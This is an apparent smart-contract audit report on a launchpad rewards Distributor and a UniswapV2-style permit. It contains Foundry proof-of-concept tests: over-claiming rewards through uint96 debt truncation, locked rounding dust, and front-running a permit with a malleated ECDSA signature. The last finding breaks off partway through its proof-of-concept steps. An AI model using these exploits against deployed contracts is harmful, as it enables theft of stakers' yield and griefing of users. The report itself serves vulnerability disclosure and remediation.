## [M-10]. RewardsTrackerLib uint96 rewardDebt overflow lets stakers over-claim rewards and break pool accounting

### Finding Severity Justification: User reward debts are stored in uint96 while accumulated rewards are computed in uint256 and then downcast without bounds checks. Once totalAccRewards exceeds 2^96-1, the cast truncates the user’s rewardDebt, breaking the accounting invariant and allowing a staker to over-claim matured rewards at the expense of others (and potentially exhaust the pool causing reverts). Impact is loss of matured yield for honest stakers. Likelihood is lower because it requires very large cumulative rewards (or a large one-off donation), but the root cause is unconditional and permissionless reward additions exist, so overall fits a High-impact/Low-likelihood profile → Medium under C4 rubric.
## Derived From Pattern/Invariant
RewardsTracker share-based accounting can overflow 96-bit debts causing reward misaccounting

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib / Distributor.stake / unstake / claim / addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad rewards system uses `RewardsTrackerLib` for share-based accounting in `Distributor`. User shares and reward debts are stored in 96-bit fields:

```solidity
struct UserRewardData {
    uint96 shares;            // User's current share count
    uint96 baseRewardDebt;    // Used to calculate base token rewards owed
    uint96 quoteRewardDebt;   // Used to calculate quote token rewards owed
}
```

Rewards per share are accumulated in full `uint256` precision, but are downcast to `uint96` without any bounds check whenever debts are updated:

```solidity
function stake(RewardPoolData storage self, address user, uint96 newShares) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.shares += newShares;
    self.totalShares += newShares;

    // Update reward debts
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.shares -= removeShares;
    self.totalShares -= removeShares;

    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user) internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    // Update reward debts
    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR; // PRECISION_FACTOR = 1e12
}
```

`totalAccRewards` can easily exceed `2**96-1` (~7.9e28) under realistic parameters: `accRewardsPerShare` can grow unbounded as more rewards are added, and `shares` can be up to `uint96`. Once `totalAccRewards(...) > type(uint96).max`, the cast to `uint96` silently truncates the high bits.

Truncation breaks the core accounting invariant that each user’s `rewardDebt` tracks the full-precision accumulated rewards for their shares. After truncation, `baseRewardDebt`/`quoteRewardDebt` become much smaller than the true accumulated amount:

- A user whose debt overflows will see an **artificially low** recorded debt.
- Subsequent calls compute `pending = totalAccRewards(shares, accPerShare) - debt` in full 256-bit precision, so `pending` becomes **much larger** than the user’s fair share.

Because `Distributor` only tracks a global `totalPendingRewards[asset]` and does not bound or validate per-user pending claims against their fair share, an attacker can:

1. Drive the pool into a state where their own `baseRewardDebt` overflows `uint96` (by having non-zero shares while very large rewards are added), causing truncation.
2. Then, as new rewards are added by honest parties, repeatedly claim using the now-truncated debt, over-claiming rewards that should belong to other stakers.

The global invariant `sum(distributed rewards) <= total rewards deposited` is enforced by `Distributor._decreaseTotalPending`, but **fairness between users is not**. Over-claims by the attacker reduce `totalPendingRewards`, leaving insufficient rewards for honest stakers, whose later claims will either:

- Receive far less than their mathematically-correct share, or
- Eventually revert with `ClaimAmountExceedsTotalPendingRewards()` when `totalPendingRewards[asset] < pendingUserAmount`.

This is an ERC-4626-style share accounting bug: the share-based reward index is full precision, but the per-user accounting uses a smaller integer type, breaking the invariant that `userDebt` is a monotonic, precise accumulator of per-share rewards.

## Impact
A staker can, after driving their own rewardDebt past 2^96, cause truncated debts and then over-claim subsequent rewards at the expense of other stakers. Honest users will either receive less than their fair share or eventually see reward claims revert once totalPendingRewards is depleted. This is theft of matured yield and permanent mis-accounting in the rewards pools.

## Command to Run Test


## Proof of Concept
Scenario (base rewards only, quote analogous):

1. A rewards pool is created for `launchAsset`, and two users Alice and Bob each have 1 share (`totalShares = 2`).
2. An external funder (e.g. the launchpad or community) adds an extremely large amount of base rewards `R1` (e.g. 1e30 wei of the reward token) via `Distributor.addRewards(...)`. This is within the `uint128` limit used by `pendingBaseRewards`.
3. Alice calls `Distributor.claimRewards(launchAsset)`:
   - `update()` computes `accBaseRewardPerShare = R1 * 1e12 / totalShares`.
   - Alice’s `totalAccBaseRewards = accBaseRewardPerShare * shares / 1e12 = R1 / 2`.
   - She correctly receives `R1/2` tokens.
   - Her `baseRewardDebt` is set to `uint96(R1/2)`. Because `R1/2 > 2^96-1`, this assignment silently truncates and wraps, leaving `baseRewardDebt` much smaller than `R1/2`.
4. Bob has not interacted yet; his `baseRewardDebt` remains 0, even though `accBaseRewardPerShare` reflects the full R1 distribution. He is mathematically owed `R1/2` as well.
5. Later, a smaller additional reward `R2` (e.g. 1e18) is added via `addRewards`.
6. Alice calls `claimRewards` again:
   - `update()` incorporates `R2` into `accBaseRewardPerShare`.
   - `totalAccBaseRewards(alice)` is roughly `(R1/2 + R2/2)` in full precision.
   - `baseAmount = totalAccBaseRewards - truncated(baseRewardDebt)` becomes roughly `(R1/2 + R2/2) + (R1/2 - truncatedDebt)`, i.e. significantly larger than her fair share `(R1 + R2)/2`.
   - Because the global `totalPendingRewards` still has enough tokens (`R1/2 + R2`) to cover this inflated claim, `_decreaseTotalPending` does not revert, and Alice successfully over-claims.
7. When Bob eventually calls `claimRewards`, his pending amount (based on full-precision `accBaseRewardPerShare` and his debt of 0) will exceed the remaining `totalPendingRewards`, causing `ClaimAmountExceedsTotalPendingRewards()` to revert or, if enough remains, pay him far less than `R1/2 + R2/2`.

Thus, a user who forces their `baseRewardDebt` to overflow can siphon a disproportionate share of later rewards, effectively stealing yield from others and/or causing permanent reward-claim failures for honest stakers.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "insufficient allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RewardsDebtOverflowTest is Test {
    Distributor distributor;
    MockERC20 rewardToken;

    address launchAsset;
    address quoteAsset;

    address alice = address(0xA11CE);
    address bob   = address(0xB0B);
    address funder = address(0xF00D);

    function setUp() public {
        distributor = new Distributor();
        // Make this test contract the launchpad so it can call onlyLaunchpad functions.
        distributor.initialize(address(this));

        rewardToken = new MockERC20();
        launchAsset = address(rewardToken);
        // Dummy quote asset; not used for this test but required by createRewardsPair.
        quoteAsset = address(0xDEAD);

        // Initialize rewards pool for launchAsset.
        distributor.createRewardsPair(launchAsset, quoteAsset);

        // Give funder a huge balance and approve the distributor.
        uint256 initialBalance = 1e30 + 1e18;
        rewardToken.mint(funder, initialBalance);
        vm.prank(funder);
        rewardToken.approve(address(distributor), type(uint256).max);

        // Give Alice and Bob 1 share each via the launchpad-only stake functions.
        distributor.increaseStake(launchAsset, alice, 1);
        distributor.increaseStake(launchAsset, bob, 1);
    }

    function testRewardDebtOverflowAllowsAliceToOverclaim() public {
        // Large base reward that will cause Alice's reward debt to overflow uint96 when she claims.
        uint128 R1 = 1e30; // <= 2^128-1, but R1/2 > 2^96-1
        uint128 R2 = 1e18; // small additional reward

        // Step 1: funder adds huge rewards R1.
        vm.prank(funder);
        distributor.addRewards(launchAsset, quoteAsset, R1, 0);

        // Step 2: Alice claims once, receiving ~R1/2 and causing her baseRewardDebt to overflow uint96.
        vm.prank(alice);
        distributor.claimRewards(launchAsset);

        // Step 3: funder adds a smaller reward R2.
        vm.prank(funder);
        distributor.addRewards(launchAsset, quoteAsset, R2, 0);

        // Step 4: Alice claims again. Because her rewardDebt was truncated, she will over-claim.
        vm.prank(alice);
        distributor.claimRewards(launchAsset);

        uint256 alicePayout = rewardToken.balanceOf(alice);
        // Fair share for Alice over both reward additions would be (R1 + R2) / 2.
        uint256 fairShare = (uint256(R1) + uint256(R2)) / 2;

        // Due to uint96 overflow and truncation of baseRewardDebt, Alice's payout exceeds her fair share.
        assertGt(alicePayout, fairShare, "Alice over-claimed rewards due to uint96 rewardDebt overflow");
    }
}


## Suggested Mitigation
Fully prevent truncation and future overflow pressure:

- Store per-user reward debts at full width.
  - Change UserRewardData.baseRewardDebt and .quoteRewardDebt to uint256.
  - Remove all downcasts when updating debts in stake/unstake/claim.
  - Update getPendingRewards/claim to subtract the uint256 debts directly (no uint128 casts).

- Use overflow-safe multiplication for totalAccRewards:
  - Replace `(shares * accRewardsPerShare) / PRECISION_FACTOR` with a 512-bit safe mulDiv (e.g., OpenZeppelin’s Math.mulDiv or a well-tested FullMath.mulDiv) to avoid intermediate overflows when shares and accRewardsPerShare become large.

- Optional hardening:
  - If storage packing is a concern, keep shares as uint96 but still compute totalAccRewards via mulDiv to stay safe; do not narrow debts.
  - If you want to fail fast on pathological states, add a sanity check to revert if `accRewardsPerShare` grows beyond a pre-defined cap, but this is not a substitute for widening the debts.

These changes remove the truncation vector and ensure correctness even under very large cumulative rewards.





 **Derived From** : Rounding in rewards index can lock small amounts from ever being skimmable

## [L-11]. Integer-division rounding in rewards index locks dust in Distributor.totalPendingRewards and makes it unskimmable

### Finding Severity Justification: The issue causes permanent locking of small rounding dust amounts in the Distributor due to integer-division during rewards index updates. This dust is counted as pending and therefore cannot be skimmed by admin, but it does not result in loss of user funds or impact core protocol functionality. Impact is limited to protocol-owned dust accumulation over time.
## Derived From Pattern/Invariant
Rounding in rewards index can lock small amounts from ever being skimmable

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Distributor tracks a global mapping totalPendingRewards[asset] that is intended to equal the amount of rewards still owed to stakers. When rewards are added, both the per-pool accounting and totalPendingRewards are increased by the full amount. However, when those pending rewards are folded into the per-share index in RewardsTrackerLib.update, integer division introduces rounding dust: the sum of all per-user rewards will be strictly less than the nominal amount added whenever (pendingRewards * PRECISION_FACTOR) is not exactly divisible by totalShares. This dust remains counted in totalPendingRewards but is never claimable, and skimExcessRewards uses totalPendingRewards as a lower bound, making this dust impossible to withdraw by the admin.

Distributor.addRewards:

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    function _increaseTotalPending(address asset, uint256 amount) internal {
        unchecked {
            totalPendingRewards[asset] += amount;
        }
        emit TotalPendingRewardsIncreased(asset, amount);
    }

RewardsTrackerLib.update and getAccRewardsPerShare:

    function getAccRewardsPerShare(RewardPoolData storage self)
        internal
        view
        returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
    {
        uint96 totalShares = self.totalShares;
        if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

        accBaseRewardsPerShare = self.accBaseRewardPerShare;
        accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

        if (self.pendingBaseRewards > 0) {
            accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
        }

        if (self.pendingQuoteRewards > 0) {
            accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
        }
    }

    function update(RewardPoolData storage self)
        internal
        returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
    {
        (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

        if (self.pendingBaseRewards > 0) {
            self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
            delete self.pendingBaseRewards;
        }

        if (self.pendingQuoteRewards > 0) {
            self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
            delete self.pendingQuoteRewards;
        }
    }

Because pendingBaseRewards is deleted after updating the index, any remainder from the integer division is never re-added or tracked anywhere. Over all users, the actual sum of claimable rewards from that batch will be R - dust, where R is the nominal reward amount and dust > 0 in most cases with multiple stakers.

Distributor.skimExcessRewards uses totalPendingRewards to enforce that only excess (non-owed) tokens can be skimmed:

    function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
        if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
        asset.safeTransfer(msg.sender, amount);
    }

Since totalPendingRewards[asset] is decremented only by actual user payouts:

    function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
            base.safeTransfer(msg.sender, baseAmount);
        }
        ...
    }

    function _decreaseTotalPending(address asset, uint256 amount) internal {
        uint256 currTotal = totalPendingRewards[asset];
        if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
        unchecked {
            totalPendingRewards[asset] -= amount;
        }
        emit TotalPendingRewardsDecreased(asset, amount);
    }

any rounding dust left unclaimed by users remains permanently in totalPendingRewards[asset]. Eventually, after all users have claimed and have zero pending rewards, there can still be a positive totalPendingRewards[asset]. Because skimExcessRewards compares amount to balanceOf(this) - totalPendingRewards[asset], the admin cannot skim this dust; it is neither user-claimable nor skimmable, and is effectively locked forever.

## Impact
The invariant that totalPendingRewards[asset] tracks exactly the remaining user-claimable rewards is violated by per-share rounding in RewardsTrackerLib. Small amounts of each added reward batch can become permanently unclaimable dust that totalPendingRewards still accounts for, preventing the owner from skimming them as excess. Over many reward additions and pools, this dust can accumulate to a non-trivial amount of stuck tokens (protocol-owned but unusable). There is no direct user loss, but protocol funds are irrevocably locked.

## Command to Run Test


## Proof of Concept
1. Deploy Distributor and initialize it with the test contract as the launchpad.
2. Deploy two mock ERC20 tokens: base (as launchAsset) and quote.
3. From the launchpad, call distributor.createRewardsPair(base, quote) to initialize a rewards pool.
4. Call distributor.increaseStake(base, user1, 1) and distributor.increaseStake(base, user2, 2), so totalShares = 3 and there are two stakers.
5. Mint 1 unit of base to rewardProvider and approve Distributor to spend it.
6. From rewardProvider, call distributor.addRewards(base, quote, 1, 0). This sets pendingBaseRewards = 1 for the pool and increases totalPendingRewards[base] by 1.
7. Have both users call distributor.claimRewards(base). Due to integer division in getAccRewardsPerShare (1 * PRECISION_FACTOR / 3), the per-user rewards round down to 0, so each claim yields baseAmount = 0 and totalPendingRewards[base] remains 1.
8. Query getPendingRewards(base, user1) and getPendingRewards(base, user2) to confirm they have 0 pending rewards.
9. Call skimExcessRewards(base, 1) as the owner. The check amount > balanceOf(distributor) - totalPendingRewards[base] is 1 > 1 - 1 = 0, so it reverts with SkimOverflow(). The 1 unit of base is permanently locked in the contract, not claimable by users and not skimmable by admin.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RoundingDustTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;

    address user1 = address(0x1111);
    address user2 = address(0x2222);
    address rewardProvider = address(0xDEAD);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set this test as launchpad

        base = new MockERC20("B", "B");
        quote = new MockERC20("Q", "Q");

        distributor.createRewardsPair(address(base), address(quote));

        // Set up shares: totalShares = 3
        distributor.increaseStake(address(base), user1, 1);
        distributor.increaseStake(address(base), user2, 2);

        // Fund reward provider and approve Distributor
        base.mint(rewardProvider, 1);
        vm.prank(rewardProvider);
        base.approve(address(distributor), 1);
    }

    function testRoundingDustLocksRewardsFromSkim() public {
        // Add 1 unit of rewards for 3 total shares
        vm.prank(rewardProvider);
        distributor.addRewards(address(base), address(quote), 1, 0);

        // Both users claim; due to rounding, they each receive 0
        vm.prank(user1);
        (uint256 c1Base, ) = distributor.claimRewards(address(base));
        assertEq(c1Base, 0);

        vm.prank(user2);
        (uint256 c2Base, ) = distributor.claimRewards(address(base));
        assertEq(c2Base, 0);

        // Verify no pending rewards at user level
        (uint256 p1Base, ) = distributor.getPendingRewards(address(base), user1);
        (uint256 p2Base, ) = distributor.getPendingRewards(address(base), user2);
        assertEq(p1Base, 0);
        assertEq(p2Base, 0);

        // Total pending tracking still shows 1 unit (unclaimable dust)
        assertEq(distributor.totalPendingRewards(address(base)), 1);

        // Owner cannot skim that unit; it is locked
        vm.expectRevert(bytes4(keccak256("SkimOverflow()")));
        distributor.skimExcessRewards(address(base), 1);
    }
}


## Suggested Mitigation
In RewardsTrackerLib.update, do not delete the full pending amounts after updating the index. Instead, carry forward the undistributed remainder so dust is eventually distributed on subsequent reward additions:

- Let increment = (pendingBaseRewards * PRECISION_FACTOR) / totalShares.
- Let distributed = (increment * totalShares) / PRECISION_FACTOR.
- Set accBaseRewardPerShare += increment.
- Set pendingBaseRewards = uint128(pendingBaseRewards - distributed) (similarly for quote).

This preserves dust in pendingBaseRewards rather than dropping it, keeping totalPendingRewards aligned with the maximum amount users can eventually claim. Optionally, add an admin-only reconciliation path when a pool is deactivated and totalShares == 0 to release any residual pendingBaseRewards/pendingQuoteRewards for that asset by decrementing totalPendingRewards by the residual and making it skimmable. This avoids permanently locked dust when no further rewards will be added.





 **Derived From** : UniswapV2 LP token permit() vulnerable to signature malleability

## [L-12]. UniswapV2ERC20.permit lacks low-s and v checks, allowing malleable signatures

### Finding Severity Justification: The permit implementation uses raw ecrecover without low-s or strict v checks, allowing signature malleability. While this deviates from EIP-2612 best practices, on-chain impact is minimal because nonces prevent replay of the same logical approval. No direct asset loss or protocol malfunction arises; the risk is largely limited to off-chain systems that might treat (v,r,s) as unique identifiers.
## Derived From Pattern/Invariant
UniswapV2 LP token permit() vulnerable to signature malleability

## Exploit Type
SignatureMalleability

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The UniswapV2-style LP token used by GTELaunchpadV2Pair implements an EIP-2612-like permit that directly relies on ecrecover without enforcing the usual anti-malleability constraints. In particular, it does not enforce that s lies in the lower half of the secp256k1 curve order, nor does it restrict v to {27, 28}.

```solidity
function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
) external {
    require(deadline >= block.timestamp, "UniswapV2: EXPIRED");
    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
        )
    );
    address recoveredAddress = ecrecover(digest, v, r, s);
    require(recoveredAddress != address(0) && recoveredAddress == owner, "UniswapV2: INVALID_SIGNATURE");
    _approve(owner, spender, value);
}
```

Consequences:
- For any valid (r,s) signature, there exists an alternative (r, s') with s' = n - s (where n is the secp256k1 order) such that ecrecover(digest, v', r, s') yields the same owner, giving two distinct (v,s) pairs encoding the same logical approval.
- Systems that treat (v,r,s) triples as unique identifiers for approvals, or that rely on a canonical signature form, can be confused or bypassed if a malicious actor uses the alternate representation.

Within this protocol, the on-chain impact is limited because permit uses a nonce and domain separator, preventing straightforward replay of the same logical approval. However, the implementation deviates from the stricter EIP-2612 recommendations and remains susceptible to signature malleability at the raw (v,r,s) level, which can affect off-chain integrations or cross-chain bridges that do not normalize signatures.

## Impact
On-chain, the approval outcome is unchanged due to nonces and domain separation, but signature malleability enables an attacker to front-run a user’s submitted permit using the malleated (v', r, s') form, consuming the nonce and causing the user’s original permit transaction to revert (gas griefing/DoS of the user’s tx). Off-chain systems or bridges that treat (v, r, s) as unique identifiers or fail to normalize signatures can be confused or bypassed. Overall severity remains low because funds are not at risk and allowances set are identical, but UX and integration risks exist.

## Command to Run Test


## Proof of Concept
Actors: owner signs a valid permit for (owner, spender, value, deadline). An attacker computes the malleated signature by setting s' = n - s (n = secp256k1 curve order) and toggling v between 27 and 28. The attacker front-runs with (v', r, s'), which is accepted by permit() and consumes nonces[owner]. The user’s original permit (v, r, s) then reverts because the contract now hashes nonce=1 while the original signature was created for nonce=0. Steps:
1) Owner forms the EIP-712 digest: keccak256("\x19\x01" || DOMAIN_SEPARATOR || keccak256(PERMIT_TYPEHASH, owner, spender, value, nonce, deadline)), with nonce = nonces[owner].
2) Owner signs to get (v, r, s) (canonical low-s form).
3) Attacker computes s' = n - s and v' = (v == 27 ? 28 : 27). Both (v, r, s) and (v', r, s') satisfy ecrecover(digest, ...) == owner.
4) Attacker calls permit(owner, spender, value, deadline, v', r, s') first. This succeeds, sets approval, and increments nonces[owner].
5) The user’s pending transaction calling permit with (v, r, s) now reverts with "UniswapV2: INVALID_SIGNATURE" because the contract hashes nonce=1 (post front-run), while the signature was for nonce=0. This demonstrates feasible front-run griefing and confirms signature malleability acceptance.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "@gte-univ2-core/UniswapV2ERC20.sol";

contract PermitMalleabilityTest is Test {
    // secp256k1 curve order
    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function test_malleatedSignatureCanFrontRunAndConsumeNonce() public {
        UniswapV2ERC20 lp = new UniswapV2ERC20();

        // actors
        uint256 ownerPk = 0xA11CE;
        address owner = vm.addr(ownerPk);
        address attacker = vm.addr(0xBEEF);
        address spender = address(0xC0FFEE);

        uint256 value = 123 ether;
        uint256 deadline = block.timestamp + 1 days;

        // compute digest exactly like the contract for current nonce
        bytes32 domainSeparator = lp.DOMAIN_SEPARATOR();
        uint256 nonce = lp.nonces(owner);
        bytes32 structHash = keccak256(
            abi.encode(
                lp.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                nonce,
                deadline
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        // sign digest with owner's key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        // create malleated signature: s' = n - s, v' toggled between 27/28
        bytes32 sPrime = bytes32(SECP256K1_N - uint256(s));
        uint8 vPrime = v == 27 ? 28 : 27;

        // sanity check: both signatures recover to the same owner for the same digest
        address rec1 = ecrecover(digest, v, r, s);
        address rec2 = ecrecover(digest, vPrime, r, sPrime);
        assertEq(rec1, owner, "original signature must recover owner");
        assertEq(rec2, owner, "malleated signature must recover owner");

        // attacker front-runs using the malleated signature, consuming the nonce and setting allowance
        vm.prank(attacker);
        lp.permit(owner, spender, value, deadline, vPrime, r, sPrime);
        assertEq(lp.allowance(owner, spender), value, "allowance should be set by malleated signature");

        // the genuine user's original signature now fails because nonce changed
        vm.expectRevert(bytes("UniswapV2: INVALID_SIGNATURE"));
        lp.permit(owner, spender, value, deadline, v, r, s);
    }
}


## Suggested Mitigation
Enforce canonical ECDSA signatures for permit in line with EIP-2/EIP-2612:
- Require v to be 27 or 28.
- Require s to be in the lower half of the secp256k1 order (s <= 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0).
- Prefer using OpenZeppelin’s ECDSA and ERC20Permit implementations, which include these checks and robust EIP-712 domain handling. This eliminates malleability, prevents front-run nonce-consumption griefing by alternate (v, r, s) representations, and aligns with ecosystem expectations.





 **Derived From** : For all users and for both base and quote rewards, totalAccRewards(user.shares, acc*RewardPerShare) <= type(uint96).max; i.e. user.baseRewardDebt and user.quoteRewardDebt never exceed uint96 range when they are (re)assigned.

## [M-13]. uint96 rewardDebt truncation in RewardsTrackerLib can brick rewards claims for heavily rewarded accounts

### Finding Severity Justification: RewardsTrackerLib stores rewardDebt as uint96 but computes cumulative rewards as uint256. When cumulative per-user rewards exceed 2**96-1, the narrowing cast silently truncates, causing subsequent pending calculations to balloon to ~k*2**96 and consistently exceed Distributor.totalPendingRewards, reverting claims and any stake/unstake paths that distribute rewards. Impact is user-specific but permanently bricks matured yield for the affected account in that pool and can interfere with launchpad stake flow. Likelihood depends on long-lived pools or very large reward donations, but the path is permissionless via addRewards and not prevented by code.
## Derived From Pattern/Invariant
For all users and for both base and quote rewards, totalAccRewards(user.shares, acc*RewardPerShare) <= type(uint96).max; i.e. user.baseRewardDebt and user.quoteRewardDebt never exceed uint96 range when they are (re)assigned.

## Exploit Type
IntegerOverflow

## Location
RewardsTrackerLib.stake / unstake / claim / update

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: While the bug is clear and reproducible, the practical likelihood hinges on whether cumulative per-user rewards can realistically exceed 2**96 for the specific launch/quote assets. This may be rare for standard assets but still possible over long periods or via large external donations, which are allowed by design.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib stores user.baseRewardDebt and user.quoteRewardDebt as uint96 but computes them as full uint256 values via totalAccRewards(shares, acc*RewardPerShare). In stake, unstake and claim, the library assigns these debts using a narrowing cast:

- stake: userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
- unstake: userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
- claim: userData.baseRewardDebt = uint96(totalAccRewards(shares, accBaseRewardsPerShare));

In Solidity 0.8, casting a uint256 larger than 2**96-1 to uint96 does not revert, it silently truncates the high bits. Once a user’s cumulative rewards (totalAccRewards(shares, accBaseRewardPerShare) or accQuote...) exceed type(uint96).max, the stored rewardDebt becomes totalAccRewards mod 2**96 instead of the true value.

On a subsequent rewards addition and claim, totalAccRewards will be close to the true (large) cumulative amount, while rewardDebt is the truncated low 96 bits. The pending amount that claim/stake/unstake computes is:

  pending = totalAccRewards - rewardDebt

After overflow this becomes roughly k * 2**96 + delta instead of the correct small delta. Distributor._distributeAssets then calls _decreaseTotalPending(asset, pending), which reverts with ClaimAmountExceedsTotalPendingRewards if pending exceeds totalPendingRewards[asset]. Because totalPendingRewards is correctly bounded by the actual tokens held, once a user’s rewardDebt has overflowed, any subsequent claim (or stake/unstake that tries to pull pending rewards) will compute an amount greater than totalPendingRewards and revert.

Net effect:
- Up to the 2**96-1 threshold, accounting is correct.
- As soon as a user’s lifetime rewards in a pool exceed 2**96-1 units of the base or quote asset, future claims/stakes/unstakes for that user in that reward pool will revert, permanently locking any further rewards for that account (and potentially breaking Launchpad flows that rely on stake/unstake for that user).

Because RewardPoolData.accBaseRewardPerShare and accQuoteRewardPerShare are unbounded uint256 and addRewards accepts uint128 amounts repeatedly, long‑lived pools or very high‑supply tokens can realistically accumulate more than 2**96 units of rewards for a single high‑share user.

## Impact
Once a user’s cumulative per-asset rewards in a pool exceed 2**96 - 1, the library truncates rewardDebt to 96 bits. From that point on, any call that attempts to realize rewards for that user (claim/increaseStake/decreaseStake) computes a massively inflated pending amount and reverts against Distributor.totalPendingRewards. This permanently bricks claims for that user in that pool (a user-specific DoS). Likelihood is bounded by the very high 2**96 threshold (~7.9e28 base units; ~79B tokens for 18‑decimals), but can be reached over time, especially if the launch asset has large supply or donors continually add rewards. Because addRewards is permissionless (and pulls real tokens), the vulnerability cannot be exploited without sending large amounts of the actual token; however, it remains a correctness bug that can disable a user’s future rewards once the threshold is crossed.

## Command to Run Test


## Proof of Concept
Key idea: do not add one very large reward (that would overflow in getAccRewardsPerShare via uint128 * uint128). Instead, repeatedly add a "safe chunk" and immediately claim to flush pending and advance acc*RewardPerShare. After enough iterations, the cumulative per-user total exceeds 2**96; the subsequent debt assignment truncates to 96 bits. A follow-up claim (even with zero new rewards) computes a huge pending due to the truncated debt and reverts against totalPendingRewards.

Steps
1) Deploy Distributor and initialize it with this test contract as launchpad.
2) Create a rewards pair for base = MockERC20 and an arbitrary quote address.
